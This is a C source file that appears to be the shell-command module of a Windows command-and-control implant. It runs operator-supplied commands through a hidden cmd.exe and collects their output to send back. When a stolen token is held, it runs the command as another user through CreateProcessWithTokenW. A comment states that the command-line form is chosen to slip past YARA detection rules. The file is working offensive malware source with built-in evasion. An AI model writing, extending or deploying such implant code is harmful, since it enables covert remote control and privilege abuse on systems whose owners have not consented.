#include "Tasks/Shell.h"

#include <windows.h>
#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"
#include "Identity.h"

#ifdef INCLUDE_CMD_SHELL

/**
 * @brief Execute a shell command using CreateProcessA and return the output.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T size     = 0;
    PCHAR cmd       = ParserGetString(arguments, &size);
    PPackage temp   = PackageInit(0, FALSE);

    HANDLE hStdOutRead      = NULL;
    HANDLE hStdOutWrite     = NULL;
    HANDLE hStdErrRead      = NULL;
    HANDLE hStdErrWrite     = NULL;
    STARTUPINFOA si         = { 0 };
    STARTUPINFOW siw        = { 0 };
    PROCESS_INFORMATION pi  = { 0 };
    SECURITY_ATTRIBUTES sa  = { 0 };
    DWORD bytesRead         = 0;
    DWORD bytesAvailable    = 0;
    CHAR cmdLine[8192]      = { 0 };
    WCHAR cmdLineW[8192]    = { 0 };
    CHAR buffer[4096]       = { 0 };

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    /* Create anonymous pipes for stdout and stderr */
    if ( !CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0) )
    {
        DWORD error = GetLastError();
        _err("\t CreatePipe (stdout) failed: %d", error);
        PackageError(taskUuid, error);
        goto CLEANUP;
    }

    if ( !CreatePipe(&hStdErrRead, &hStdErrWrite, &sa, 0) )
    {
        DWORD error = GetLastError();
        _err("\t CreatePipe (stderr) failed: %d", error);
        PackageError(taskUuid, error);
        goto CLEANUP;
    }

    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0);

    si.cb           = sizeof(STARTUPINFOA);
    si.hStdOutput   = hStdOutWrite;
    si.hStdError    = hStdErrWrite;
    si.dwFlags      |= STARTF_USESTDHANDLES;

    /* Construct command line: cmd.exe /c "user_command" */
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /d /c \"%s\"", cmd); // To avoid trivial yara rules

    /* Create the process - use stolen token if available */
    BOOL processCreated = FALSE;
    if ( gIdentityToken != NULL )
    {
        _dbg("\t Using impersonated token for process creation");
        
        /* Convert command line to wide characters for CreateProcessWithTokenW */
        if (MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, cmdLineW, sizeof(cmdLineW) / sizeof(WCHAR)) == 0)
        {
            DWORD error = GetLastError();
            _err("\t Failed to convert command line to wide char: %d", error);
            PackageError(taskUuid, error);
            goto CLEANUP;
        }
        
        /* Setup wide character startup info */
        siw.cb           = sizeof(STARTUPINFOW);
        siw.hStdOutput   = hStdOutWrite;
        siw.hStdError    = hStdErrWrite;
        siw.dwFlags      |= STARTF_USESTDHANDLES;
        
        processCreated = CreateProcessWithTokenW(
            gIdentityToken,   // Token handle
            0,                // Logon flags
            NULL,             // Application name
            cmdLineW,         // Command line (wide char)
            CREATE_NO_WINDOW, // Creation flags
            NULL,             // Environment
            NULL,             // Current directory
            &siw,             // Startup info (wide char)
            &pi);             // Process information
    }
    else
    {
        processCreated = CreateProcessA(
            NULL,             // Application name
            cmdLine,          // Command line
            NULL,             // Process security attributes
            NULL,             // Thread security attributes
            TRUE,             // Inherit handles
            CREATE_NO_WINDOW, // Creation flags
            NULL,             // Environment
            NULL,             // Current directory
            &si,              // Startup info
            &pi);             // Process information
    }

    if ( !processCreated )
    {
        DWORD error = GetLastError();
        _err("\t Process creation failed: %d", error);
        PackageError(taskUuid, error);
        goto CLEANUP;
    }

    /* Close write handles in parent */
    CloseHandle(hStdOutWrite);
    CloseHandle(hStdErrWrite);
    hStdOutWrite = NULL;
    hStdErrWrite = NULL;

    CloseHandle(pi.hThread);
    pi.hThread = NULL;

    DWORD maxWaitTime   = 3000;
    DWORD startTime     = GetTickCount();
    BOOL hasReadAnyData = FALSE;

    /* Read stdout with timeout */
    while ( TRUE )
    {
        if ( PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvailable, NULL) )
        {
            if ( bytesAvailable > 0 )
            {
                hasReadAnyData = TRUE;
                
                if ( ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) )
                {
                    if (bytesRead > 0)
                    {
                        PackageAddBytes(temp, (PBYTE)buffer, bytesRead, FALSE);
                    }
                }
                
                continue;
            }
            else
            {
                if ( hasReadAnyData )
                {
                    DWORD exitCode = 0;
                    if ( pi.hProcess && GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE )
                    {
                        break;
                    }
                    if ( GetTickCount() - startTime > maxWaitTime )
                    {
                        break;
                    }
                    Sleep(50);
                    continue;
                }
                else
                {
                    if ( GetTickCount() - startTime > maxWaitTime )
                    {
                        break;
                    }
                    Sleep(50);
                    continue;
                }
            }
        }
        else
        {
            DWORD error = GetLastError();
            if ( error == ERROR_BROKEN_PIPE || error == ERROR_INVALID_HANDLE )
            {
                if ( ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0 )
                {
                    PackageAddBytes(temp, (PBYTE)buffer, bytesRead, FALSE);
                }
                break;
            }
            break;
        }
    }

    bytesAvailable = 0;
    if ( PeekNamedPipe(hStdErrRead, NULL, 0, NULL, &bytesAvailable, NULL) )
    {
        while ( bytesAvailable > 0 )
        {
            if ( ReadFile(hStdErrRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
            {
                PackageAddBytes(temp, (PBYTE)buffer, bytesRead, FALSE);
            }
            bytesAvailable = 0;
            PeekNamedPipe(hStdErrRead, NULL, 0, NULL, &bytesAvailable, NULL);
        }
    }


    // Success
    PackageComplete(taskUuid, temp);

CLEANUP:
    if (hStdOutRead) CloseHandle(hStdOutRead);
    if (hStdOutWrite) CloseHandle(hStdOutWrite);
    if (hStdErrRead) CloseHandle(hStdErrRead);
    if (hStdErrWrite) CloseHandle(hStdErrWrite);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);

    PackageDestroy(temp);

    return;
}
#endif
